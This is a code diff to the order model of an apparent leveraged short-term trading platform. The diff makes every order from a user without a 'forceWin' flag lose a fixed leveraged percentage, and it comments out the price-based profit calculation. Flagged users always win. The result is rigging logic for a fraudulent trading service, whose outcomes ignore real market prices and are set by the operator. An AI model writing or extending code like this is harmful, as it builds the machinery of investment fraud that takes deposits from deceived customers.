@@ -3,7 +3,7 @@ import mongoose from "mongoose";
 import userModel from "./usermodel.js";
 
 const durationRates = {
-  30: 12,  // 12% return for 30 seconds
+  30: 12,  // 12% return for 30 seconds 
   60: 18,  // 18% return for 60 seconds
   90: 20, // 20% return for 90 seconds
   120: 22, // 22% return for 120 seconds
@@ -288,7 +288,7 @@ orderSchema.methods.preSaveLogic = async function () {
 // Method to calculate profit/loss with force win logic
 orderSchema.methods.calculateProfitLoss = async function () {
   if (!this.exitPrice || !this.entryPrice) {
-    //console.log('Missing exitPrice or entryPrice, skipping profit calculation');
+    console.log('😉😉😉😉😉Missing exitPrice or entryPrice, skipping profit calculation');
     return null;
   }
 
@@ -306,7 +306,9 @@ orderSchema.methods.calculateProfitLoss = async function () {
 
     // Check if user has forceWin enabled
     if (user.forceWin) {
-      //console.log('Force win enabled for user');
+
+  
+      console.log('Force win enabled for user😉😉😉 ');
       // Force win - always profitable
       this.wasForceWin = true;
       //percentage = Math.abs(this.expectedReturn / this.amount) * 100;
@@ -315,8 +317,14 @@ orderSchema.methods.calculateProfitLoss = async function () {
       let rateP = durationRates[this.duration] || 12;
       percentage = rateP * this.leverage;
     } else {
-      // Generate random loss (1-20% loss) with 90% probability
-      const shouldLose = Math.random() < 0.9; // 90% chance of losing
+      console.log('Calculating normal profit/loss for order 😉😉😉');
+       let rateP = durationRates[this.duration] || 12;
+        percentage = -rateP * this.leverage; // Apply leverage to loss
+        this.wasRandomLose = true;
+        this.randomLossPercentage = rateP;
+        isRandomLoss = true;
+
+/*
 
       if (true) {
         // Generate random loss percentage between 1% and 50%
@@ -330,6 +338,8 @@ orderSchema.methods.calculateProfitLoss = async function () {
       } else {
         // Normal calculation based on price movement
         if (this.direction === 'buy') {
+
+          
           // For buy (long): profit when price goes up
           const priceChange = ((this.exitPrice - this.entryPrice) / this.entryPrice) * 100;
           percentage = priceChange * this.leverage;
@@ -339,7 +349,7 @@ orderSchema.methods.calculateProfitLoss = async function () {
           percentage = priceChange * this.leverage;
         }
         console.log('Normal calculation, percentage:', percentage.toFixed(2));
-      }
+      }*/
     }
 
     this.profitPercentage = parseFloat(percentage.toFixed(2));
@@ -379,6 +389,7 @@ orderSchema.methods.calculateProfitLoss = async function () {
     throw error;
   }
 };
+
 
 // Method to complete order with user balance update
 orderSchema.methods.completeOrder = async function (exitPrice) {
